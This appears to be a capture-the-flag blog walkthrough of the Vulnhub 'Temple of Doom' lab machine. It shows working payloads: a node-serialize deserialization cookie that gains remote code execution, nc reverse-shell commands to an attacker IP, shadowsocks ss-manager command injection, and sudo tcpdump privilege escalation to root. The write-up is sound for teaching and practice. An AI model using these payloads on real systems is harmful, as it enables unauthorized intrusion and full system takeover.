---
published: false
---
Vulnhub virtual machine; OSCP prep box and a change of pace. To gain access to box requires an exploitation of node.js and a special component through some encoding leads to RCE. For the priv-esc you work through a service running as another user and pivot to root.


----------

Legal Usage:
*The information provided by executeatwill is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “*[*ethical hacker*](https://www.dictionary.com/browse/ethical-hacker)*” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.*

*By continued reading, you acknowledge the aforementioned user risk/responsibilities.*


----------

Vulnhub Link: https://www.vulnhub.com/entry/temple-of-doom-1,243/
Files: temple-of-DOOM-v1.ova (Size: 2.8 GB)


**Phase 1 | Reconnaissance**
Reconnaissance is the act of gathering preliminary data or intelligence on your target. The data is gathered in order to better plan for your attack. Reconnaissance can be performed actively (meaning that you are directly touching the target) or passively (meaning that your recon is being performed through an intermediary).

Discover VM on network

    netdiscover -r 192.168.56.0/24

![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552326156743_image.png)


Target: 192.165.56.116

VM login page confirms

![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552326205099_image.png)



**Phase 2 | Scanning**
The phase of scanning requires the application of technical tools to gather further intelligence on your target, but in this case, the intel being sought is more commonly about the systems that they have in place. A good example would be the use of a vulnerability scanner on a target network.

Nmap Scan:

    nmap -sV -sC -oA nmap/templeofdoom 192.168.56.116

![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552326323001_image.png)


we see the front door - SSH
interesting non standard port - 666 - running Node.js

Navigate via browser to site.

![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552326415073_image.png)


source:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552326446774_image.png)


not looking like a promising way to gain a foot hold. Further enumeration via dirbuster

Nmap UDP Scan:

    gobuster -u http://192.168.56.116:666 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-webservices.out



nIkto Scan:

    nikto -host http://192.168.56.116:666

![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552327096077_image.png)


**Phase 3 | Gaining Access**
Phase 3 gaining access requires taking control of one or more network devices in order to either extract data from the target, or to use that device to then launch attacks on other targets.

Capturing request with Burp Interceptor

![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552327445346_image.png)


profile seems to be encoded in base64

Decoded

    {"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":Friday, 13 Oct 2018 00:00:00 GMTIn0%3D

![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552327558401_image.png)


well looks like 3 pieces of infomation are being sent in this cookie, username, csrftoken and an Expires. After playing around with sending the api just the username and csrftoken and still receiving errors just submitted the username with `}` in base64 and was greeted by a welcome.


![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552328261846_image.png)


through the testing we saw that the backend is a `node-serialize`

![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552328352970_image.png)


My knowledge base of this application is limited… very limited so we ask the oracle aka google.

google: node-serialize vulnerabilities

found several explanations but a majority of it reminded me how much I don’t know. I eventually found this wordpress blog that explained things on a manner I was able to wrap my mind around.
Link: https://hd7exploit.wordpress.com/2017/05/29/exploiting-node-js-deserialization-bug-for-remote-code-execution-cve-2017-5941/

code example that causes a `ls -al`

    {"username":"_$$ND_FUNC$$_function(){return require('child_process').execSync('ls -l /',(e,out,err)=>{console.log(out);}); }()"}

encode with base64 and send as cookie.

result:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552329203351_image.png)



sending a reverse shell via `nc`

    {"username":"_$$ND_FUNC$$_function(){return require('child_process').execSync('nc 192.168.56.102 9000 -e /bin/sh',(e,out,err)=>{console.log(out);}); }()"}

encoded to base64 and sent as cookie.

we have a shell

![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552329826385_image.png)


upgrade shell

    python -c 'import pty; pty.spawn("/bin/bash")'
![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552329913395_image.png)


well after uploading the priv-esc scripts and found a few exploits but we don’t have `gcc` on the box to compile. Furthermore, I discovered after returning to the box several times a certain required process was not starting. Thus continuing the priv-esc to become impossible. After several restarts of the VM and much research on the matter I am able to see the processes used by user: fireman

viewing fireman processes

    ps aux | grep fireman

![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552672563826_image.png)


from this point we can see that fireman is calling a binary called `ss-manager`. From this point we can search for exploits pertaining to that binary.

`ss-manager` is vulnerable to “shadowsocks-libev 3.1.0 - Command Execution”
link: https://www.exploit-db.com/exploits/43006

which this vulnerability stems from “control of Shadowsocks servers for multiple users, it spawns new servers if needed.”

    Proof of Concept
    ----------------
    As passed configuration requests are getting executed, the following command
    will create file "evil" in /tmp/ on the server:
    
    nc -u 127.0.0.1 8839
        add: {"server_port":8003, "password":"test", "method":"||touch
    /tmp/evil||"}

Testing to see if port 8839 is open on VM.

    netstat -lntu

![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552672889444_image.png)


we can now attempt to `nc` to this port and parse a reverse tcp connection back to our system.

setup local listener on port `1234`

    nc -lvnp 1234

setting up reverse tcp connection on target

    nc -u 127.0.0.1 8839
    add: {"server_port":8003, "password":"test", "method":"||nc 192.168.56.102 1234 -e /bin/bash||"}

![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552673177781_image.png)


we have now escalated to fireman

![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552673290069_image.png)


upgrade shell

    python -c 'import pty; pty.spawn("/bin/bash")'

![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552673340220_image.png)


perform privilege check with `sudo -l`

![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552673385076_image.png)


focusing on `tcpdump` I found an article that explains how to get root via tcpdump.
Link: https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/

basically with the command `-z` we will be able to run commands via tcpdump.

so we need a script for this `-z` command to run so we will just echo a `nc` connection back to our local system on port 4567 and change the chmod.

    echo "nc 192.168.56.102 4567 -e /bin/bash" > shell.sh
    chmod +x shell.sh

![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552674002634_image.png)


next, move to the `sudo tcpdump`

    sudo tcpdump -ln -w /dev/null -W 1 -G 1 -z /dev/shm/shell.sh -Z root 
![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552674054625_image.png)


resulting in an execution of our `shell.sh` and a reverse connection.

![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552674092092_image.png)


we have achieved root!

**Phase 4 | Maintaining Access**
Maintaining access requires taking the steps involved in being able to be persistently within the target environment in order to gather as much data as possible. The attacker must remain stealthy in this phase, so as to not get caught while using the host environment.

upgrading shell and searching for flag:

    python -c 'import pty; pty.spawn("/bin/bash")'
    cat /root/flag.txt

![](https://d2mxuefqeaa7sj.cloudfront.net/s_D70A1EC97DF1A4BB47BF1E7B3EAFBEC86E52E2AD587D1A8BC3E10D54A7CA2C35_1552674161326_image.png)


bring me the root!

-exec


